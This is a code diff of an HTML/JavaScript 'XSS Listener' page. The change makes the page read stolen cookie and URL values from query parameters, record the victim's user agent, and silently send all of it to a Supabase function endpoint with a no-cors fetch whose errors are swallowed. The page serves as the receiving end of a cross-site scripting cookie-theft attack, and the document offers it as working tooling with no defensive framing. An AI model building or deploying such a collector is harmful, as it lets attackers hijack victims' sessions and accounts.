@@ -1,53 +1,42 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <title>XSS Listener - Aryan</title>
-    <style>
-        body { font-family: monospace; background: #000; color: #0f0; padding: 20px; }
-        pre { background: #111; padding: 15px; border: 1px solid #0f0; white-space: pre-wrap; }
-        h1 { color: #0f0; }
-        button { margin-top: 10px; }
-    </style>
-</head>
-<body>
-    <h1>🔴 XSS Listener Active</h1>
-    <p><strong>Listener URL:</strong> https://aryangeek.github.io/xss-listener/listener.html</p>
-    <button onclick="clearLogs()">Clear Logs</button>
-    <hr>
-    <pre id="logs">Waiting for hits...\n\n</pre>
+<script>
+    const logsDiv = document.getElementById('logs');
+    const BACKEND_URL = 'https://viwictbgpkifzlwltcpw.supabase.co/functions/v1/log-xss';  // ← PASTE YOUR URL HERE
 
-    <script>
-        const logsDiv = document.getElementById('logs');
+    function loadLogs() {
+        const savedLogs = localStorage.getItem('xssLogs') || '=== Previous Logs ===\n\n';
+        logsDiv.innerHTML = savedLogs;
+    }
 
-        function loadLogs() {
-            const savedLogs = localStorage.getItem('xssLogs') || '=== Previous Logs ===\n\n';
-            logsDiv.innerHTML = savedLogs;
-        }
+    function addLog() {
+        const params = new URLSearchParams(window.location.search);
+        const cookie = params.get('c') || 'no_cookie';
+        const url = params.get('u') || 'no_url';
+        const time = new Date().toISOString();
+        const userAgent = navigator.userAgent;
 
-        function addLog() {
-            const params = new URLSearchParams(window.location.search);
-            const cookie = params.get('c') || 'no_cookie';
-            const url = params.get('u') || 'no_url';
-            const time = new Date().toISOString();
+        const newLog = `=== XSS HIT ===\nTime: ${time}\nCookie: ${cookie}\nURL: ${url}\nUser-Agent: ${userAgent}\n========================\n\n`;
 
-            const newLog = `=== XSS HIT ===\nTime: ${time}\nCookie: ${cookie}\nURL: ${url}\n========================\n\n`;
+        // Show in browser (local view)
+        logsDiv.innerHTML += newLog;
+        localStorage.setItem('xssLogs', logsDiv.innerHTML);
 
-            // Add to display
-            logsDiv.innerHTML += newLog;
+        // === SEND TO SUPABASE (global logging) ===
+        const sendParams = new URLSearchParams({
+            c: cookie,
+            u: url,
+            ua: userAgent
+        });
 
-            // Save to localStorage
-            const allLogs = logsDiv.innerHTML;
-            localStorage.setItem('xssLogs', allLogs);
+        fetch(BACKEND_URL + '?' + sendParams.toString(), {
+            method: 'GET',
+            mode: 'no-cors'
+        }).catch(() => {});   // silent fail is fine
 
-            console.log(newLog);
-        }
+        console.log(newLog);
+    }
 
-        // Load old logs + check for new hit
-        loadLogs();
-        if (window.location.search) {
-            addLog();
-        }
-    </script>
-</body>
-</html>
+    loadLogs();
+    if (window.location.search) {
+        addLog();
+    }
+</script>
